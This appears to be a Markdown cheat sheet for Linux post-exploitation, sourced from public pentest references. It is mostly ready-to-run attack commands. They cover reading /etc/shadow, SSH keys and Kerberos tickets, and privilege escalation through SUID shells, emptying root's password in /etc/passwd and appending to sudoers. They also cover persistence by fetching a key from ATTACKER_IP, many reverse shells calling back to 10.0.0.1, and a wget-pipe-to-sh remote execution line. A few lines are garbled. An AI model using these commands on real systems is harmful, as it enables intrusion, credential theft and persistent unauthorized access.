##### Table of Contents
- [Collecting Information](#collecting_info)
    - [Blind Files](#blind_files)
    - [System](#system)
    - [Networking](#networking)
    - [User accounts](#user_accounts)
    - [Obtain user's information](#user_info)
    - [Credentials](#credentials)
    - [Configs](#configs)
    - [Determine Distro](#distro)
    - [Installed Packages](#packages)
    - [Package Sources](#packages_sources)
    - [Finding Important Files](#finding)

- [Escalating](#escalating)
    - [Looking for possible opened paths](#paths)
- [Maintaining control](#maintain)
    - [Reverse Shell](#rev_shell)
    - [Execute a Remote Script](#remote_script)
    - [TTY]



<a name="collecting_info"/></a>
## Collecting Information

<a name="blind_files"/></a>
### Blind Files
things to pull when all you can do is blindly read like in LFI/dir traversal (Don’t forget %00!)

| File                      | Contents and Reason                               |
| ------------------------- | ------------------------------------------------  |
| /etc/resolv.conf          | Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd |
| /etc/motd                 | Message of the Day                                |
| /etc/issue	            | current version of distro                         |
| /etc/passwd	            | List of local users                               |
| /etc/shadow	            | List of users’ passwords’ hashes (requires root)  |
| /home/xxx/.bash_history   | Will give you some directory context              |


<a name="system"/></a>
### System

| Command                   | Description and/or Reason                         |
| ------------------------- | ------------------------------------------------- |
| uname -a                  | Prints the kernel version, arch, sometimes distro |
| ps aux                    | List all running processes                        |
| top -n 1 -d               | Print process, 1 is a number of lines             |
| id                        | Your current username, groups                     |
| arch, uname -m            | Kernel processor architecture                     |
| w                         | who is connected, uptime and load avg             |
| who -a                    | uptime, runlevel, tty, proceses etc.              |
| gcc -v                    | Returns the version of GCC.                       |
| mysql --version           | Returns the version of MySQL.                     |
| perl -v                   | Returns the version of Perl.                      |
| ruby -v                   | Returns the version of Ruby.                      |
| python --version          | Returns the version of Python.                    |
| df -k                     | mounted fs, size, % use, dev and mount point      |
| mount                     | mounted fs                                        |
| last -a                   | Last users logged on                              |
| lastcomm                  |                                                   |
| lastlog                   |                                                   |
| lastlogin (BSD)           |                                                   |
| getenforce                | Get the status of SELinux (Enforcing, Permissive or Disabled) |
| dmesg                     | Informations from the last system boot            |
| lspci                     | prints all PCI buses and devices                  |
| lsusb                     | prints all USB buses and devices                  |
| lscpu                     | prints CPU information                            |
| lshw                      | list hardware information                         |
| ex                        |                                                   |
| cat /proc/cpuinfo         |                                                   |
| cat /proc/meminfo         |                                                   |
| du -h --max-depth=1 /     | note: can cause heavy disk i/o                    |
| which nmap                | locate a command (ie nmap or nc)                  |
| locate bin/nmap           |                                                   |
| locate bin/nc             |                                                   |
| jps -l                    |                                                   |
| java -version             | Returns the version of Java.                      |


<a name="networking"/></a>
### Networking

| Command                   | Description and/or Reason                         |
| ------------------------- | ------------------------------------------------- |
| hostname -f               ||
| ip addr show              ||
| ip ro show                ||
| ifconfig -a               ||
| route -n                  ||
| cat /etc/network/interfaces ||
| iptables -L -n -v         ||
| iptables -t nat -L -n -v  ||
| ip6tables -L -n -v        ||
| iptables-save             ||
| netstat -anop             ||
| netstat -r                ||
| netstat -nltupw           | root with raw sockets                             |
| arp -a                    ||
| lsof -nPi                 ||
| cat /proc/net/*           | more discreet, all the information given by the above commands can be found by looking into the files under /proc/net, and this approach is less likely to trigger monitoring or other stuff |


<a name="user_accounts"/></a>
### User Accounts

| Command                   | Description and/or Reason                         |
| ------------------------- | ------------------------------------------------- |
| cat /etc/passwd           | local accounts                                    |
| cat /etc/shadow           | password hashes on Linux                          |
| /etc/security/passwd      | password hashes on AIX                            |
| cat /etc/group            | groups (or /etc/gshadow)                          |
| getent passwd             | should dump all local, LDAP, NIS, whatever the system is using|
| getent group              | same for groups                                   |
| pdbedit -L -w             | Samba’s own database                              |
| pdbedit -L -v             |                                                   |
| cat /etc/aliases          | mail aliases                                      |
| find /etc -name aliases   |                                                   |
| getent aliases            |                                                   |
| ypcat passwd              | displays NIS password file                        |

<a name="user_info"/></a>
### Obtain user's information

* ls -alh /home/*/	
* ls -alh /home/*/.ssh/
* cat /home/*/.ssh/authorized_keys
* cat /home/*/.ssh/known_hosts
* cat /home/\*/.*hist* # you can learn a lot from this
* find /home/\*/.vnc /home/\*/.subversion -type f 
* grep ^ssh /home/*/.*hist*
* grep ^telnet /home/*/.*hist*
* grep ^mysql /home/*/.*hist*
* cat /home/*/.viminfo
* sudo -l # if sudoers is not. readable, this sometimes works per user
* crontab -l
* cat /home/*/.mysql_history
* sudo -p (allows the user to define what the password prompt will be, useful for fun customization with aliases or shell scripts)

<a name="credentials"/></a>
### Credentials

| File/Folder                   | Description and/or Reason         |
| ----------------------------- | --------------------------------- |
| /home/\*/.ssh/id*             | SSH keys, often passwordless      |
| /tmp/krb5cc_*                 | Kerberos tickets                  |
| /tmp/krb5.keytab              | Kerberos tickets                  |
| /home/*/.gnupg/secring.gpgs   | PGP keys                          |


<a name="configs"/></a>
### Configs

* ls -aRl /etc/ * awk '$1 ~ /w.$/' * grep -v lrwx 2>/dev/nullte	
* cat /etc/issue{,.net}
* cat /etc/master.passwd
* cat /etc/group
* cat /etc/hosts
* cat /etc/crontab
* cat /etc/sysctl.conf
* for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)
* cat /etc/resolv.conf
* cat /etc/syslog.conf
* cat /etc/chttp.conf
* cat /etc/lighttpd.conf
* cat /etc/cups/cupsd.confcda
* cat /etc/inetd.conf	
* cat /opt/lampp/etc/httpd.conf
* cat /etc/samba/smb.conf
* cat /etc/openldap/ldap.conf
* cat /etc/ldap/ldap.conf
* cat /etc/exports
* cat /etc/auto.master
* cat /etc/auto_master
* cat /etc/fstab
* find /etc/sysconfig/ -type f -exec cat {} \;


<a name="distro"/></a>
### Determine Distro

| File                                              | Description and/or Reason             |
| ------------------------------------------------- | ------------------------------------- |
| uname -a                                          | often hints at it pretty well         |
| lsb_release -d                                    | Generic command for all LSB distros   |
| /etc/os-release                                   | Generic for distros using “systemd”   |
| /etc/issue                                        | Generic but often modified            |
| cat /etc/*release                                 |                                       |
| /etc/SUSE-release                                 | Novell SUSE                           |
| /etc/redhat-release, /etc/redhat_version          | Red Hat                               |
| /etc/fedora-release                               | Fedora                                |
| /etc/slackware-release, /etc/slackware-version    | Slackware                             |
| /etc/debian_release, /etc/debian_version          | Debian                                |
| /etc/mandrake-release                             | Mandrake                              |
| /etc/sun-release                                  | Sun JDS                               |
| /etc/release                                      | Solaris/Sparc                         |
| /etc/gentoo-release                               | Gentoo                                |
| /etc/arch-release                                 | Arch Linux (file will be empty)       |
| arch                                              | OpenBSD; sample: “OpenBSD.amd64”      |


<a name="packages"/></a>
### Installed Packages

* rpm -qa --last | head
* yum list | grep installed
* Debian
    * dpkg -l
    * dpkg -l | grep -i “linux-image”
    * dpkg --get-selections
* {Free,Net}BSD: pkg_info
* Solaris: pkginfo
* Gentoo: cd /var/db/pkg/ && ls -d */*	# always works
* Arch Linux: pacman -Q


<a name="packages_sources"/></a>
### Package Sources

* cat /etc/apt/sources.list
* ls -l /etc/yum.repos.d/
* cat /etc/yum.conf


<a name="finding"/></a>
### Finding Important Files

* ls -dlR */
* ls -alR | grep ^d
* find /var -type d
* ls -dl \`find /var -type d\`
* ls -dl \`find /var -type d\` | grep -v root
* find /var ! -user root -type d -ls
* find /var/log -type f -exec ls -la {} \;
* find / -perm -4000 (find all suid files)
* ls -alhtr /mnt
* ls -alhtr /media
* ls -alhtr /tmp
* ls -alhtr /home
* cd /home/; treels /home/*/.ssh/*
* find /home -type f -iname '.*history'
* ls -lart /etc/rc.d/
* locate tar | grep [.]tar$  # Remember to updatedb before running locate
* locate tgz | grep [.]tgz$
* locate sql | grep [.]sql$
* locate settings | grep [.]php$  
* locate config.inc | grep [.]php$
* ls /home/\*/id*
*  .properties | grep [.]properties # java config files
* locate .xml | grep [.]xml # java/.net config files
* find /sbin /usr/sbin /opt /lib \`echo $PATH | ‘sed s/:/ /g’\` -perm /6000  -ls # find suids
* locate rhosts
* `grep -i user [filename]`  
* `grep -i pass [filename]`  
* `grep -C 5 "password" [filename]`  
* `find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"`


Also, check http://incolumitas.com/wp-content/uploads/2012/12/blackhats_view.pdf for some one-liners that find world writable directories/files and more.



<a name="escalating"/><a>
## Escalating

<a name="paths"/><a>
### Looking for possible opened paths
* ls -alh /root/
* sudo -l
* cat /etc/sudoers
* cat /etc/shadow
* cat /etc/master.passwd # OpenBSD
* cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*
* lsof -nPi
* ls /home/\*/.ssh/*

If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.

MySQL   
`sys_exec('usermod -a -G admin username')`

Find SUID or GUID  
`find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null`  
`find / -perm -1000 -type d 2>/dev/null`  
`find / -perm -g=s -type f 2>/dev/null`  

Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.

function /usr/bin/foo () { /usr/bin/echo "It works"; }  
$ export -f /usr/bin/foo  
$ /usr/bin/foo  
    It works  
    
Generating SUID C Shell for /bin/bash
```int main(void){
     setresuid(0, 0, 0);
     system("/bin/bash");
} 
 ```
 Without interactive shell
 
 ```echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c```
 
 If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:   
 `chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;`
 
 If /etc/passwd has incorrect permissions, you can root:
 `echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su`
 
 Add user to sudoers in python   
 ```#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
 ```
 
`sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash`
 
<a name="maintain"/><a>
## Maintaining control

Add public key to authorized keys  
`echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys`

<a name="rev_shell"/><a>
### Reverse Shell
Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).
* ```perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'```
* ```python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'```
* `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
* ```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234``` # note need -l on some versions, and many does NOT support -e anymore
* ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```
* xterm -display 10.0.0.1:1se	
* Listener- Xnest :1
* Add permission to connect- xhost +victimIP
* ssh -NR 3333:localhost:22 user@yourhost
* `nc -e /bin/sh 10.0.0.1 1234`

<a name="remote_script"/><a>
### Execute a Remote Script

`wget http://server/file.sh -O- | sh`  
This command forces the download of a file and immediately its execution

### TTY Shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

Set PATH TERM and SHELL if missing:
`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`  
`export TERM=xterm`  
`export SHELL=bash`  

### Escape Limited Shell

`echo os.system('/bin/bash')`  
`/bin/sh -i`  
`exec "/bin/sh";`  
`perl —e 'exec "/bin/sh";'`  




Referances:
https://guif.re/linuxeop  
https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#paths  
http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
